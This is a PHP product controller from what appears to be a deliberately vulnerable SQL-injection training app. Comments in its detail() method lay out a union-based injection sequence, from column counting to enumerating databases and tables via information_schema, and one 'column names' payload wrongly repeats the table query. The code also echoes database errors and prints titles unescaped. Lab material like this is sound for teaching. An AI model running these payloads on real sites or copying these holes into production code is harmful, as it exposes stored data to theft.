<?php

namespace controller;


use model;

class ProductController {

    private $productModel;

    public function __construct() {
        $this->productModel = new \model\ProductModel;
    }

    public function list() {
        $products = $this->productModel->getProducts();
        echo 'Click on each product to see the detail<br>';
        $html = "<table width=\"100%\" border=\"1\" rules=\"all\">";
        $html .= "<thead>";
        $html .= "<tr>";
        $html .= "<th>ID</th>";
        $html .= "<th>Title</th>";
        $html .= "<th>Price</th>";
        $html .= "</tr>";
        $html .= "</thead>";
        $html .= "<tbody>";
        foreach ($products as $key => $product) {
            $html .= "<tr>";
            $html .= "<td>" . ++$key . "</td>";
            $html .= "<td><a href=\"?page=product&route=detail&id=" . $product->id . "\">" . $product->title . "</a></td>";
            $html .= "<td>$" . \number_format($product->price, 2) . "</td>";
            $html .= "</tr>";
        }
        $html .= "</tbody>";
        $html .= "</table>";

        echo $html;
    }

    public function detail($id) {
        // Start to break by below injections
        // --> ?page=product&route=detail&id=4' => cause sql error
        // --> ?page=product&route=detail&id=4 order by 5-- => This still works
        // --> ?page=product&route=detail&id=4 order by 6-- => Broken! this means there are only 5 columns
        // --> ?page=product&route=detail&id=-4 union select 1,2,3,4,5-- => To see vulnerable columns
        // You can now take over the database and tables

        // ==> Get all databases
        // ?page=product&route=detail&id=-3 union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata
        
        // ==> Get table names
        // ?page=product&route=detail&id=-3 union select 1,group_concat(table_name),3,4,5%20from information_schema.tables where table_schema=database()--

        // ==> Get column names
        // ?page=product&route=detail&id=-3 union select 1,group_concat(table_name),3,4,5%20from information_schema.tables where table_schema=database()--
        try {
            $product = $this->productModel->getProduct($id);
            if (is_object($product)) {
                echo 'Start to break by using blind SQL Injection. Simple string to break is using single quote \' to place at end of id <br>';
                $html = "#: " . $product->id;
                $html .= "<br>Title: " . $product->title;
                $html .= "<br>Price $" . \number_format($product->price, 2);
                echo $html;
            }
        } catch (\PDOException $e) {
            echo $e->getMessage();
        }
    }
}